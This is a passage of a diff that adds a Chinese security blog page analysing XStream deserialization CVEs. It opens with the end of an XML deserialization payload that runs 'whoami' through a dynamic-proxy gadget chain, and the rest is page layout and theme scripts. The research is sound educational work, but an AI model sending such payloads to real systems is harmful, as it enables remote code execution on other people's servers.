class="name">implementing__method</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">sun.tracing.dtrace.DTraceProbe</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">probes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/XStream/" class="">
+              XStream
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>CurlySean</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2025/07/23/XStream反序列化/" target="_blank" title="XStream反序列化">http://curlysean.github.io/2025/07/23/XStream反序列化/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pic4.zhimg.com/80/v2-83ea273b88e119d9615aed0d89aad4ab_1440w.webp" class="lazyload placeholder" data-srcset="https://pic4.zhimg.com/80/v2-83ea273b88e119d9615aed0d89aad4ab_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+    </div>
+    <a href="/2025/07/28/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MYSQL/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> 上一篇:
+        <div class="title-text">JDBC反序列化-MYSQL</div>
+      </div>
+      
+      <!-- <div class="content">
+        JDBC反序列化-MYSQL
+前言
+
+文章首发于：https://www.freebuf.com/articles/vu
+      </div> -->
+    </a>
+  </div>
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+    </div>
+    <a href="/2025/07/22/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fas fa-angle-right"></i>
+        <div class="title-text">Log4j2远程代码执行</div>
+      </div>
+      <!-- <div class="content">
+        Log4j2远程代码执行
+前言
+
+Log4j感觉还是比较好利用的，在shagou大佬的面试中，给出一个log4j漏洞绕过
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/medias/alipay.jpg" class="lazyload placeholder" data-srcset="/medias/alipay.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/medias/wechatpay.jpg" class="lazyload placeholder" data-srcset="/medias/wechatpay.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script defer src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+
+<!-- 还需要在后面这个地址里设置script, comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <aside id='l_side'>
+  
+    
+      <section class="widget side_blogger">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box circle' href='/about/'>
+          <img src='/medias/avatar.png'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>CurlySean</h2>
+        
+        
+          <p>想要成为大佬的卷毛肖恩</p>
+
+        
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:5345414e@gmail.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/CurlySean"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=631722343"
+              class="social fab fa-qq flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+  
+  
+
+  <div class="layout_sticky">    
+    
+      
+<section class="widget side_toc">
+  
+  <header>
+    
+      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+    <div class="toc-main">
+      <div class="toc-content">
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pHjEh"><span class="toc-text">XStream反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HYMga"><span class="toc-text">XStream基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CiWpH"><span class="toc-text">XStream简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NQH63"><span class="toc-text">XStreamDemo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HQqKY"><span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#a7WyU"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ccR02"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IezYj"><span class="toc-text">EventHandler类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MZFkZ"><span class="toc-text">Converter转换器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zPE1W"><span class="toc-text">DynamicProxyConverter 动态代理转换器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xq3UI"><span class="toc-text">漏洞复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#q276u"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nzzQU"><span class="toc-text">CVE-2013-7285</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NJS2M"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ZzNQH"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gNwxd"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JUbkO"><span class="toc-text">CVE-2021-21344</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uQpkR"><span class="toc-text">CVE-2021-21351</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aMlfF"><span class="toc-text">CVE-2020-26217</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WZtEe"><span class="toc-text">CVE-2021-39144</span></a></li></ol></li></ol></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/07/28/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MYSQL/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic4.zhimg.com/80/v2-83ea273b88e119d9615aed0d89aad4ab_1440w.webp" class="lazyload placeholder" data-srcset="https://pic4.zhimg.com/80/v2-83ea273b88e119d9615aed0d89aad4ab_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">07-28</span>
+                
+              </div>
+              <a class="post-title" href="/2025/07/28/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MYSQL/">JDBC反序列化-MYSQL</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/07/23/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">07-23</span>
+                
+              </div>
+              <a class="post-title" href="/2025/07/23/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">XStream反序列化</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/07/22/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">07-22</span>
+                
+              </div>
+              <a class="post-title" href="/2025/07/22/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Log4j2远程代码执行</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/07/21/CVE-2017-10271WebLogicXMLDecoder/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">07-21</span>
+                
+              </div>
+              <a class="post-title" href="/2025/07/21/CVE-2017-10271WebLogicXMLDecoder/">CVE-2017-10271 WebLogic XMLDecoder反序列化</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/07/20/CVE-2025-32462-32463Sudo%E6%8F%90%E6%9D%83/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://picx.zhimg.com/80/v2-b44931ea513e5f7b3b06f2703f79653c_1440w.webp" class="lazyload placeholder" data-srcset="https://picx.zhimg.com/80/v2-b44931ea513e5f7b3b06f2703f79653c_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">07-20</span>
+                
+              </div>
+              <a class="post-title" href="/2025/07/20/CVE-2025-32462-32463Sudo%E6%8F%90%E6%9D%83/">CVE-2025-32462/32463Sudo提权</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script defer src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script defer>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark" onclick="toggleDarkMode()">
+  <div class="dark-content">
+    <i class="fas" id="darkIcon" aria-hidden="true"></i>
+  </div>
+</div>
+
+<script defer>
+  $(function() {
+    // 初始化暗黑模式状态
